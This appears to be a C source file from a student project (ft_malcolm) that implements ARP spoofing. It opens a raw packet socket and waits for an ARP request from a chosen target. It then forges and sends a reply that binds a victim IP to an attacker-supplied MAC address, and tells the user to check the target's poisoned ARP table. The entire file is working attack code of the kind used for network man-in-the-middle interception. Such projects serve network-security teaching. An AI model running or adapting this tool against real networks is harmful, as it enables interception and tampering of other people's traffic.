/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ft_malcolm.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: cclaude <cclaude@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/09/01 18:43:59 by cclaude           #+#    #+#             */
/*   Updated: 2021/09/11 20:26:21 by cclaude          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_malcolm.h"

int packet_socket = -1;

void sig_int (int sig_num)
{
	printf("\nProgram was interrupted, closing socket...\n");
	if (packet_socket != -1)
		close(packet_socket);
	exit(sig_num);
}

void my_mac (unsigned char *addr, int ifindex)
{
	struct ifaddrs *ifaddr;
	struct ifaddrs *ifa;

	getifaddrs(&ifaddr);
	ifa = ifaddr;
	while (ifa && ((struct sockaddr_ll *)ifa->ifa_addr)->sll_ifindex != ifindex)
		ifa = ifa->ifa_next;

	memcopy(addr, ((struct sockaddr_ll *)ifa->ifa_addr)->sll_addr, 6);
	freeifaddrs(ifaddr);
}

void edit_packet (struct ethhdr *eth, struct ether_arp *arp, char **av, int ifindex, int verbose)
{
	if (verbose)
		print_arp(" ARP request received ", eth, arp);

	my_mac(eth->h_source, ifindex);
	fill_mac(eth->h_dest, av[4]);

	arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
	*(unsigned int *)arp->arp_spa = inet_addr(av[1]);
	fill_mac(arp->arp_sha, av[2]);
	*(unsigned int *)arp->arp_tpa = inet_addr(av[3]);
	fill_mac(arp->arp_tha, av[4]);

	if (verbose)
		print_arp("Constructing ARP reply", eth, arp);
}

int main (int ac, char **av)
{
	signal(SIGINT, sig_int);

	if (error_check(ac, av))
		return (1);

	char packet[1000] = {0};
	struct sockaddr_ll addr = {0};
	socklen_t addrlen = sizeof(addr);
	struct ethhdr *eth;
	struct ether_arp *arp;

	packet_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (packet_socket == -1)
	{
		printf("ft_malcolm: error opening socket\n");
		return (1);
	}

	printf("Waiting for an ARP request...\n\n");

	while (1)
	{
		recvfrom(packet_socket, packet, 1000, 0, (struct sockaddr *)&addr, &addrlen);

		eth = (struct ethhdr *)packet;
		arp = (struct ether_arp *)(packet + ETHER_HDR_LEN);

		if (ntohs(eth->h_proto) == ETH_P_ARP && ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST
		&& *(unsigned int *)arp->arp_tpa == inet_addr(av[1]) && *(unsigned int *)arp->arp_spa == inet_addr(av[3]))
			break ;
	}

	printf("Received %sARP request%s !\n", CYAN, RESET);
	printf("%s%s%s asks : %sWho is %s ?%s\n\n", YELLOW, av[3], RESET, RED, av[1], RESET);

	edit_packet(eth, arp, av, addr.sll_ifindex, av[5] != NULL);

	sendto(packet_socket, packet, ETHER_HDR_LEN + ETHER_ARP_LEN, 0, (struct sockaddr *)&addr, sizeof(struct sockaddr_ll));

	printf("Sent spoofed %sARP reply%s, check ARP table on target !\n\n", CYAN, RESET);

	close(packet_socket);

	return (0);
}
